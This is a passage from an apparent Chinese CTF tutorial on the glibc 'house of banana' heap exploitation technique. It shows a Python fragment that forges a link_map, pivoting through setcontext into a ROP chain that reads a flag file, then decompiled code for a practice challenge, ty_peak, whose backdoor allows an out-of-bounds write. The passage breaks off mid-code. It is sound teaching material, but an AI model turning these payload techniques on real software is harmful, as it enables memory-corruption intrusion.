class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(fake_link_map_addr + <span class="number">8</span> * <span class="number">8</span> - <span class="number">3</span> * <span class="number">8</span>)<span class="comment">#fake_l_next_2</span></span><br><span class="line">fake_link_map += up64(fake_link_map_addr + <span class="number">13</span> * <span class="number">8</span> - <span class="number">3</span> * <span class="number">8</span>)<span class="comment">#fake_l_next_3</span></span><br><span class="line">fake_link_map += up64(fake_link_map_addr + <span class="number">7</span> * <span class="number">8</span> - <span class="number">3</span> * <span class="number">8</span>)<span class="comment">#fake_l_real_2</span></span><br><span class="line">fake_link_map += up64(fake_link_map_addr + <span class="number">8</span> * <span class="number">8</span> - <span class="number">3</span> * <span class="number">8</span>)<span class="comment">#fake_l_real_3</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">13</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(<span class="number">0</span>)<span class="comment">#fake_l_next_4</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">15</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(fake_link_map_addr + <span class="number">13</span> * <span class="number">8</span> - <span class="number">3</span> * <span class="number">8</span>)<span class="comment">#fake_l_real_4</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">34</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(fake_link_map_addr + <span class="number">37</span> * <span class="number">8</span>)<span class="comment">#l_info[26]</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">36</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(fake_link_map_addr + <span class="number">39</span> * <span class="number">8</span>)<span class="comment">#l_info[26]</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">38</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(fake_link_map_addr + <span class="number">52</span> * <span class="number">8</span>)<span class="comment">#fini_array</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">40</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(<span class="number">8</span> * <span class="number">2</span>)<span class="comment">#fini_arraysize</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">52</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(lib_base + lib.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span>) + up64(ret)<span class="comment">#fini_array</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">66</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(<span class="number">0</span>)<span class="comment">#setcontext_rdi</span></span><br><span class="line">fake_link_map += up64(stack_address)<span class="comment">#setcontext_rsi</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">70</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(<span class="built_in">len</span>(rop))<span class="comment">#setcontext_rdx</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">73</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(stack_address)<span class="comment">#setcontext_stack</span></span><br><span class="line">fake_link_map += up64(lib_base + lib.sym[<span class="string">&#x27;read&#x27;</span>])<span class="comment">#setcontext_retn</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">99</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += up64(<span class="number">0x800000000</span>)<span class="comment">#l_init_called</span></span><br><span class="line">fake_link_map += <span class="string">&#x27;flag\x00&#x27;</span><span class="comment">#flag</span></span><br></pre></td></tr></table></figure></p><p>  这里最后给出<strong>setcontext</strong>方便使用的部分指令，其他攻击中也会进行使用，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000000580</span>a0 &lt;setcontext@@GLIBC_2<span class="number">.2</span><span class="number">.5</span>&gt;:</span><br><span class="line">..............................................................</span><br><span class="line">   <span class="number">580</span>dd:<span class="number">48</span> <span class="number">8b</span> a2 a0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0xa0</span>(%rdx),%rsp</span><br><span class="line">   <span class="number">580e4</span>:<span class="number">48</span> <span class="number">8b</span> <span class="number">9</span>a <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x80</span>(%rdx),%rbx</span><br><span class="line">   <span class="number">580</span>eb:<span class="number">48</span> <span class="number">8b</span> <span class="number">6</span>a <span class="number">78</span>          mov    <span class="number">0x78</span>(%rdx),%rbp</span><br><span class="line">   <span class="number">580</span>ef:<span class="number">4</span>c <span class="number">8b</span> <span class="number">62</span> <span class="number">48</span>          mov    <span class="number">0x48</span>(%rdx),%r12</span><br><span class="line">   <span class="number">580f</span>3:<span class="number">4</span>c <span class="number">8b</span> <span class="number">6</span>a <span class="number">50</span>          mov    <span class="number">0x50</span>(%rdx),%r13</span><br><span class="line">   <span class="number">580f</span>7:<span class="number">4</span>c <span class="number">8b</span> <span class="number">72</span> <span class="number">58</span>          mov    <span class="number">0x58</span>(%rdx),%r14 <span class="number">580f</span>b:<span class="number">4</span>c <span class="number">8b</span> <span class="number">7</span>a <span class="number">60</span>          mov    <span class="number">0x60</span>(%rdx),%r15</span><br><span class="line">   <span class="number">580f</span>f:<span class="number">64</span> f7 <span class="number">04</span> <span class="number">25</span> <span class="number">48</span> <span class="number">00</span> <span class="number">00</span> testl  $<span class="number">0x2</span>,%fs:<span class="number">0x48</span></span><br><span class="line">   <span class="number">58106</span>:<span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">   <span class="number">5810b</span>:<span class="number">0f</span> <span class="number">84</span> b5 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    je     <span class="number">581</span>c6 &lt;setcontext@@GLIBC_2<span class="number">.2</span><span class="number">.5</span>+<span class="number">0x126</span>&gt;</span><br><span class="line">..............................................................</span><br><span class="line">   <span class="number">581</span>c6:<span class="number">48</span> <span class="number">8b</span> <span class="number">8</span>a a8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0xa8</span>(%rdx),%rcx</span><br><span class="line">   <span class="number">581</span>cd:<span class="number">51</span>                   push   %rcx</span><br><span class="line">   <span class="number">581</span>ce:<span class="number">48</span> <span class="number">8b</span> <span class="number">72</span> <span class="number">70</span>          mov    <span class="number">0x70</span>(%rdx),%rsi</span><br><span class="line">   <span class="number">581</span>d2:<span class="number">48</span> <span class="number">8b</span> <span class="number">7</span>a <span class="number">68</span>          mov    <span class="number">0x68</span>(%rdx),%rdi</span><br><span class="line">   <span class="number">581</span>d6:<span class="number">48</span> <span class="number">8b</span> <span class="number">8</span>a <span class="number">98</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x98</span>(%rdx),%rcx</span><br><span class="line">   <span class="number">581</span>dd:<span class="number">4</span>c <span class="number">8b</span> <span class="number">42</span> <span class="number">28</span>          mov    <span class="number">0x28</span>(%rdx),%r8</span><br><span class="line">   <span class="number">581e1</span>:<span class="number">4</span>c <span class="number">8b</span> <span class="number">4</span>a <span class="number">30</span>          mov    <span class="number">0x30</span>(%rdx),%r9</span><br><span class="line">   <span class="number">581e5</span>:<span class="number">48</span> <span class="number">8b</span> <span class="number">92</span> <span class="number">88</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x88</span>(%rdx),%rdx</span><br><span class="line">   <span class="number">581</span>ec:<span class="number">31</span> c0                xor    %eax,%eax</span><br><span class="line">   <span class="number">581</span>ee:c3                   retq   </span><br><span class="line">   <span class="number">581</span>ef:<span class="number">48</span> <span class="number">8b</span> <span class="number">0</span>d <span class="number">7</span>a <span class="number">2</span>c <span class="number">19</span> <span class="number">00</span> mov    <span class="number">0x192c7a</span>(%rip),%rcx        # <span class="number">1</span>eae70 &lt;h_errlist@@GLIBC_2<span class="number">.2</span><span class="number">.5</span>+<span class="number">0xd50</span>&gt;</span><br><span class="line">   <span class="number">581f</span>6:f7 d8                neg    %eax</span><br><span class="line">   <span class="number">581f</span>8:<span class="number">64</span> <span class="number">89</span> <span class="number">01</span>             mov    %eax,%fs:(%rcx)</span><br><span class="line">   <span class="number">581f</span>b:<span class="number">48</span> <span class="number">83</span> c8 ff          or     $<span class="number">0xffffffffffffffff</span>,%rax</span><br><span class="line">   <span class="number">581f</span>f:c3                   retq   </span><br></pre></td></tr></table></figure></p><h3 id="样例-ty-peak-修改"><a href="#样例-ty-peak-修改" class="headerlink" title="样例:ty_peak(修改)"></a>样例:ty_peak(修改)</h3><p>  <a href="house_of_banana.tar.gz">点击下载题目资源</a></p><h4 id="题目保护"><a href="#题目保护" class="headerlink" title="题目保护"></a>题目保护</h4><p>  如下图所示，基本所有保护全开<br>  <img src="ty_peak_修改_保护机制.png" alt="ty_peak(修改)保护机制"></p><h4 id="题目逻辑"><a href="#题目逻辑" class="headerlink" title="题目逻辑"></a>题目逻辑</h4><p>  同样是一个标准的菜单堆，框架如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init_proc();</span><br><span class="line">  myputs(<span class="string">&quot;This is a simple game !!!&quot;</span>);</span><br><span class="line">  myprintf(<span class="string">&quot;Please start your operation (&lt;&gt; - &lt;&gt;) \n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    myputs(off_1DA9);</span><br><span class="line">    check();</span><br><span class="line">    <span class="keyword">switch</span> ( return_number() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        view();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        gift();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        myputs(<span class="string">&quot;Wrong choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  其中对于<code>add</code>功能，其同样会添加一个给定输入大小的内存块，但是一定从非<strong>tcache bin</strong>中分配，逻辑如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">uint32_t</span> idx; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( idx = <span class="number">0</span>; idx &lt; <span class="number">0x10</span> &amp;&amp; note[idx]; ++idx )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= <span class="number">0x10</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  myprintf(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  size = (<span class="type">unsigned</span> <span class="type">int</span>)return_number();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x400</span> &amp;&amp; size &lt;= <span class="number">0x2000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    note[idx] = (<span class="type">char</span> *)mycalloc(size);</span><br><span class="line">    sizes[idx] = size;</span><br><span class="line">    myprintf(<span class="string">&quot;Message: &quot;</span>);</span><br><span class="line">    myread(note[idx], size);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  对于<code>delete</code>功能，就是正常的<code>free</code>掉申请的内存即可，相关逻辑如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  myprintf(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  idx = return_number();</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( note[idx] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(note[idx]);</span><br><span class="line">      note[idx] = <span class="number">0LL</span>;</span><br><span class="line">      sizes[idx] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  对于<code>view</code>功能来说，其就是输出当前内存块上的内容，代码如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">view</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  myprintf(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  idx = return_number();</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( note[idx] )</span><br><span class="line">    &#123;</span><br><span class="line">      myprintf(<span class="string">&quot;Message: &quot;</span>);</span><br><span class="line">      myputs(note[idx]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  其次，这里同样提供了传统的<code>edit</code>函数，从而配合前面的<code>view</code>函数，可以泄露当前的堆地址、libc基址，相关的代码如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-818h]</span></span><br><span class="line">  <span class="type">uint32_t</span> idx; <span class="comment">// [rsp+Ch] [rbp-814h]</span></span><br><span class="line">  <span class="type">char</span> code[<span class="number">2048</span>]; <span class="comment">// [rsp+10h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+818h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  myprintf(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  idx = return_number();</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">0x10</span> &amp;&amp; note[idx] )</span><br><span class="line">  &#123;</span><br><span class="line">    myputs(<span class="string">&quot;Code :&quot;</span>);</span><br><span class="line">    myread(code, <span class="number">0x800</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(mem, <span class="number">0</span>, <span class="keyword">sizeof</span>(mem));</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      b[<span class="number">0</span>] = code[i];</span><br><span class="line">      <span class="keyword">if</span> ( b[<span class="number">0</span>] &lt;= <span class="number">0</span> || b[<span class="number">0</span>] == <span class="number">32</span> || b[<span class="number">0</span>] == <span class="number">10</span> || b[<span class="number">0</span>] == <span class="number">9</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v0 = i;</span><br><span class="line">      mem[v0] = b[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    fill(mem, idx);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  其最终具体执行的<code>fill</code>函数的内容如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">fill</span><span class="params">(<span class="type">char</span> *mem, <span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// [rsp+2Bh] [rbp-15h]</span></span><br><span class="line"></span><br><span class="line">  q = <span class="number">0</span>;</span><br><span class="line">  p = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = q++;</span><br><span class="line">    c[<span class="number">0</span>] = mem[v2];</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( c[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( p &lt; sizes[idx] )</span><br><span class="line">        v3 = q &lt; <span class="number">2048</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( c[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;!&#x27;</span>:</span><br><span class="line">        ++note[idx][p];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;&amp;&#x27;</span>:</span><br><span class="line">        note[idx][p] = getchar();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">        ++p;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> ( p &gt;= <span class="number">0</span> )</span><br><span class="line">          --p;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          myprintf(<span class="string">&quot;error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;@&#x27;</span>:</span><br><span class="line">        --note[idx][p];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nError code:%c\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)c[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  最后，这里还给出了一个后门函数，通过构造特殊的输入，从而可以实现且仅能实现一次越界写，内容如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">gift</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="type">uint32_t</span> idx; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  <span class="type">char</span> code[<span class="number">256</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( cookie != <span class="number">0xDEADBEEFDEADBEEF</span>LL )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  myprintf(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  idx = return_number();</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">0x10</span> &amp;&amp; note[idx] )</span><br><span class="line">  &#123;</span><br><span class="line">    myputs(<span class="string">&quot;Code :&quot;</span>);</span><br><span class="line">    myread(code, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(mem, <span class="number">0</span>, <span class="keyword">sizeof</span>(mem));</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      b[<span class="number">0</span>] = code[i];</span><br><span class="line">      <span class="keyword">if</span> ( b[<span class="number">0</span>] &lt;= <span class="number">0</span> || b[<span class="number">0</span>] == <span class="number">32</span> || b[<span class="number">0</span>] == <span class="number">10</span> || b[<span class="number">0</span>] == <span class="number">9</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v0 = i;</span><br><span class="line">      mem[v0] = b[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    interpret(mem, idx);</span><br><span class="line">    cookie = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  这里漏洞点在<code>interpret</code>函数的<strong>[</strong>和<strong>]</strong>中，相关的逻辑如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">interpret</span><span class="params">(<span class="type">char</span> *mem, <span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+Fh] [rbp-41h]</span></span><br><span class="line"></span><br><span class="line">  p = <span class="number">0</span>;</span><br><span class="line">  q = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = q++;</span><br><span class="line">    c[<span class="number">0</span>] = mem[v2];</span><br><span class="line">    <span class="keyword">if</span> ( !c[<span class="number">0</span>] )</span><br><span class="line">      <span 